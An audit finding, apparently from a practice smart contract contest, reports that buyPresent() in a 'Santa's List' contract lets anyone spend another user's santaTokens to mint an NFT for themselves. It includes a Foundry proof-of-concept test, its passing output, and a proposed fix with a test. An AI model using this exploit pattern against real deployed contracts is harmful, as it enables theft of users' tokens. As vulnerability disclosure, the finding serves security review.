## [H1] buyPresent() are not working as expected

### Severity

High Risk

### Date Modified

Dec 5th, 2023

### Summary

According to the documentation, the idea behind buyPresent() is that a user with ERC20 santaTokens uses them to buy a present, i.e. an ERC721 santaList NFT.

But as it is built, anyone can use other users' santaTokens to buy presents for their own account.

### Vulnerability Details (PoC)

In this PoC, the Grinch (previously added as a user) will use the user's santaToken to buy himself a present.

```
function test_incorrectBuyPresent() external {
        // 1. Santa add user to the extra_nice list
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        // 2. user collect present: NFT = 1; santaToken = 1e18
        vm.startPrank(user);
        santasList.collectPresent();
        assertEq(santasList.balanceOf(user), 1);
        assertEq(santaToken.balanceOf(user), 1e18);
        vm.stopPrank();

        // 3. grinch use the user santaToken to by a present to himself
        vm.prank(grinch);
        santasList.buyPresent(user);
        assertEq(santasList.balanceOf(grinch), 1);
        assertEq(santaToken.balanceOf(user), 0);
    }
```

```
➜  2023-11-Santas-List git:(main) ✗ forge test --mt test_incorrectBuyPresent
[⠢] Compiling...
[⠔] Compiling 1 files with 0.8.22
[⠒] Solc 0.8.22 finished in 1.23s
Compiler run successful!

Running 1 test for test/unit/SantasListTest.t.sol:SantasListTest
[PASS] test_incorrectBuyPresent() (gas: 206174)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.73ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
➜  2023-11-Santas-List git:(main) ✗
```

### Impact

Anyone can stole other users santaTokens to buy presents. No aprove nedeed.

### Tools Used

Manual, foundry

### Recommendations

Some information about this function is confusing and needs more explanation from the development team, but in order to achieve a certain level of expected behaviour, we can try this function:

```
function buyPresent(address presentReceiver) external {
        require(i_santaToken.balanceOf(msg.sender) >= 1e18, "You do not have santaTokens");
        i_santaToken.burn(msg.sender);
        _mintAndIncrement();
        _transfer(msg.sender, presentReceiver, s_tokenCounter - 1);
    }

```

Test:

```
function test_correctOptionForBuyPresent() external {
        // 1. Santa add user to the extra_nice list
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        // 2. user collect present: NFT = 1; santaToken = 1e18
        vm.startPrank(user);
        santasList.collectPresent();
        assertEq(santasList.balanceOf(user), 1);
        assertEq(santaToken.balanceOf(user), 1e18);
        vm.stopPrank();

        // 3. user buy a present for his mate
        vm.prank(user);
        santasList.buyPresent(mate);
        assertEq(santasList.balanceOf(mate), 1);
        assertEq(santaToken.balanceOf(user), 0);
    }
```

```
➜  2023-11-Santas-List git:(main) ✗ forge test --mt test_correctOptionForBuyPresent
[⠢] Compiling...
No files changed, compilation skipped

Running 1 test for test/unit/SantasListTest.t.sol:SantasListTest
[PASS] test_correctOptionForBuyPresent() (gas: 213008)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.51ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
➜  2023-11-Santas-List git:(main) ✗
```
